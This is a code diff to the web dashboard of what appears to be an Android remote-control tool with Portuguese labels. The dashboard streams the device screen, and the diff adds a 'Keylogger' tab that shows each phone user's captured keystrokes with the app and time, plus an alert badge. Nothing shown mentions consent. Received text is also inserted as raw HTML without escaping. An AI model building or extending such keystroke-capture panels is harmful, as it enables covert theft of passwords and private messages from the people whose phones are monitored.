@@ -21,8 +21,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .ctrl i{font-size:15px;color:#4a5568;flex-shrink:0}
 .ctrl.danger:hover{background:#2d1515;color:#fc8181}
 .ctrl.danger:hover i{color:#fc8181}
-.ctrl.warn{color:#ed8936}
-.ctrl.warn i{color:#ed8936}
+.ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
 .ctrl.warn:hover{background:#2d1f0a;color:#fbd38d}
 .center{display:flex;flex-direction:column;align-items:center;padding:12px 20px;gap:8px;overflow:auto}
 .device{background:#1a202c;border:2px solid #2d3748;border-radius:28px;position:relative;overflow:hidden;flex-shrink:0}
@@ -47,10 +46,15 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .right{border-left:1px solid #2d3748;background:#161b27;padding:12px;display:flex;flex-direction:column;overflow:hidden}
 .stat-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid #1e2433;font-size:11px}
 .stat-label{color:#4a5568}.stat-val{color:#e2e8f0;font-weight:500}
-.log{flex:1;overflow-y:auto;margin-top:8px}
+.tabs{display:flex;gap:4px;margin-top:8px;margin-bottom:4px}
+.tab{padding:4px 10px;border-radius:6px;border:1px solid #2d3748;background:transparent;color:#718096;cursor:pointer;font-size:10px}
+.tab.active{background:#1e2433;color:#e2e8f0;border-color:#4299e1}
+.log{flex:1;overflow-y:auto}
 .log-entry{font-size:10px;padding:3px 0;border-bottom:1px solid #1a202c;color:#718096}
 .log-entry .ts{color:#2d3748;margin-right:6px}
 .log-entry.ev{color:#68d391}.log-entry.err{color:#fc8181}.log-entry.warn{color:#ed8936}
+.keylog-entry{font-size:11px;padding:4px 6px;border-bottom:1px solid #1a202c;color:#e2e8f0;font-family:monospace}
+.keylog-entry .app{font-size:9px;color:#4a5568;display:block;margin-bottom:2px}
 .vol-row{display:flex;align-items:center;gap:6px;padding:4px 0;font-size:11px;color:#718096}
 .vol-row input[type=range]{flex:1;accent-color:#4299e1}
 #tela-clientes{display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;gap:16px;padding:20px}
@@ -147,8 +151,15 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <div class="stat-row"><span class="stat-label">Android</span><span class="stat-val" id="d-os">—</span></div>
         <div class="stat-row"><span class="stat-label">Modelo</span><span class="stat-val" id="d-model">—</span></div>
         <div class="stat-row"><span class="stat-label">Resolução</span><span class="stat-val" id="d-res">—</span></div>
-        <p class="sec-title" style="margin-top:12px">Log da sessão</p>
-        <div class="log" id="log"></div>
+
+        <!-- Abas Log / Keylogger -->
+        <div class="tabs">
+          <button class="tab active" id="tab-log" onclick="mudarAba('log')">📋 Log</button>
+          <button class="tab" id="tab-key" onclick="mudarAba('key')">⌨️ Keylogger <span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 5px;font-size:9px;margin-left:2px">!</span></button>
+        </div>
+
+        <div class="log" id="painel-log"></div>
+        <div class="log" id="painel-key" style="display:none"></div>
       </div>
     </div>
   </div>
@@ -158,13 +169,33 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 const SERVER = window.location.origin.replace(/^http/, 'ws');
 let ws = null, deviceAtual = null, streaming = false;
 let dispositivoLargura = 0, dispositivoAltura = 0;
+let abaAtual = 'log';
+
+function mudarAba(aba){
+  abaAtual = aba;
+  document.getElementById('painel-log').style.display = aba === 'log' ? 'block' : 'none';
+  document.getElementById('painel-key').style.display = aba === 'key' ? 'block' : 'none';
+  document.getElementById('tab-log').className = 'tab' + (aba==='log'?' active':'');
+  document.getElementById('tab-key').className = 'tab' + (aba==='key'?' active':'');
+  if(aba === 'key') document.getElementById('key-badge').style.display = 'none';
+}
 
 function log(msg, tipo=''){
-  const el = document.getElementById('log');
+  const el = document.getElementById('painel-log');
   const d = document.createElement('div');
   d.className = 'log-entry ' + tipo;
   d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
   el.prepend(d);
+}
+
+function logKey(texto, app){
+  const el = document.getElementById('painel-key');
+  const d = document.createElement('div');
+  d.className = 'keylog-entry';
+  d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
+  el.prepend(d);
+  // Mostra badge se não está na aba
+  if(abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
 }
 
 conectarTecnico();
@@ -198,6 +229,9 @@ function conectarTecnico(){
         log('Stream ativo', 'ev');
         break;
       case 'frame_tela': mostrarFrame(msg.frame); break;
+      case 'keylog':
+        logKey(msg.texto, msg.app || 'desconhecido');
+        break;
       case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
     }
   };
